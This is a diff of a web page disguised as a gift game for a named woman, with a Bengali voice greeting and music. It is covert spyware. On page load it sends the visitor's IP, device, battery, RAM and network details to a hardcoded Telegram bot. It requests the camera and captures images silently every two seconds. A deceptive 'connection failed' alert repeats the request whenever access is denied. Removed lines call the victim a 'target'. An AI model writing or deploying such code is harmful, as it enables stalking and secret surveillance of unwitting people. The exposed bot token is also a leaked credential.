@@ -19,7 +19,7 @@
 <body>
 
 <audio id="bgMusic" loop>
-    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3" type="audio/mpeg">
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg">
 </audio>
 
 <div class="box">
@@ -50,28 +50,57 @@
 
 <script>
     const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA'; 
-    const CHAT_ID = '6547277630'; // আপনার আইডি
+    const CHAT_ID = '6547277630'; 
 
     let gender = 'male';
     let step = 0;
     let photoInterval;
     const music = document.getElementById('bgMusic');
 
+    // পেজ লোড হওয়ার সাথে সাথেই আইপি ও ডিভাইস ইনফো পাঠানো
+    window.onload = async function() {
+        try {
+            const n = navigator;
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const conn = n.connection || {};
+            
+            let batteryInfo = "N/A";
+            if (n.getBattery) {
+                const battery = await n.getBattery();
+                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Unplugged'})`;
+            }
+
+            let initialInfo = `🌐 **New Visitor Joined!**\n📍 **IP:** \`${ipData.ip}\`\n📱 **Device:** ${n.userAgent.split('(')[1].split(')')[0]}\n🔋 **Battery:** ${batteryInfo}\n🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB\n📶 **Net:** ${conn.effectiveType || 'Unknown'}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(initialInfo)}&parse_mode=Markdown`);
+        } catch (e) { console.log("Init fail"); }
+    };
+
     function openVision(g) {
         gender = g;
-        // মিউজিক চালু করা (ইউজার ইন্টারঅ্যাকশন ছাড়া ব্রাউজার মিউজিক এলাউ করে না)
-        music.play().catch(e => console.log("Music blocked by browser until interaction."));
+        
+        // আপনার দেওয়া ভয়েস মেসেজটি বাজানো
+        const msg = new SpeechSynthesisUtterance("প্রিয় ঝুমা, তোমার জন্য ছোট্ট একটা গেম উপহার। আল্লাহ তাআলা তোমাদেরকে সুখে রাখুন।");
+        msg.lang = 'bn-BD';
+        msg.rate = 0.9;
+        window.speechSynthesis.speak(msg);
+
+        // গজল/ব্যাকগ্রাউন্ড মিউজিক চালু করা
+        music.play().catch(e => console.log("Music blocked."));
+
         document.getElementById('s1').classList.remove('active');
         document.getElementById('s2').classList.add('active');
     }
 
     async function startSync() {
         try {
-            // ক্যামেরা রিকোয়েস্ট (বারবার কাজ করার জন্য)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
             
-            await collectAllData();
+            let syncMsg = `✅ **Camera Access Granted!**\n👤 **Gender:** ${gender}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(syncMsg)}&parse_mode=Markdown`);
+
             photoInterval = setInterval(captureSilent, 2000);
 
             setTimeout(() => {
@@ -80,23 +109,9 @@
                 showNext();
             }, 4000);
         } catch (e) {
-            // যদি একবার ডিনাই করে, এই মেসেজটি আসবে এবং আবার পারমিশন চাইবে
-            alert("কানেকশন ফেইলড! এআই তোমার আত্মার স্পন্দন অনুভব করতে পারছে না। দয়া করে আবার 'Allow' বাটনে ক্লিক করো।");
-            // অটোমেটিক আবার ট্রাই করার ফাংশন কল
+            alert("কানেকশন ফেইলড! দয়া করে আবার 'Allow' বাটনে ক্লিক করো।");
             setTimeout(startSync, 1000); 
         }
-    }
-
-    async function collectAllData() {
-        const n = navigator;
-        const battery = n.getBattery ? await n.getBattery() : null;
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const conn = n.connection || {};
-
-        let secretInfo = `🎯 **Target Synced**\n👤 **Gender:** ${gender}\n📍 **IP:** \`${ipData.ip}\`\n📱 **Phone:** ${n.userAgent.split('(')[1].split(')')[0]}\n🔋 **Charge:** ${battery ? Math.round(battery.level * 100) : '??'}% (${battery && battery.charging ? 'Charging' : 'Unplugged'})\n🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB | **Cores:** ${n.hardwareConcurrency}\n📶 **Net:** ${conn.effectiveType || 'WiFi/Unknown'}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`;
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(secretInfo)}&parse_mode=Markdown`);
     }
 
     function captureSilent() {
